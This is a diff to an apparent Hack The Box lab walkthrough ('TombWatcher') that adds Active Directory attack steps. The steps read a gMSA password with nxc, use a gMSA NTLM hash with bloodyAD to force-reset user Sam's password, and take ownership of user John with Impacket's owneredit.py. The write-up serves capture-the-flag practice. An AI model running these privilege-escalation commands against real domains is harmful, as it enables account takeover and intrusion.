@@ -47,7 +47,13 @@
 `nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`
 ![image](https://github.com/user-attachments/assets/cbdf43c4-6647-4fa9-a0a3-e2b0588ebf90)
 
-7. 
+7. Ansible_dev$ has ForceChangePassword priv on Sam. Use ansible_dev$'s hash to change Sam's password
+`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u "ansible_dev\$" -p ":4b21348ca4a9edff9689cdf75cbda439" set password sam Password1`
 
+8. Sam has WriteOwner privilege on John. Change John's owner to Sam using Impacket's owneredit.py script
+`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/owneredit.py -action write  -target 'John' -dc-ip 10.129.47.3 -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password1'` 
+
+
+9. 
 
 
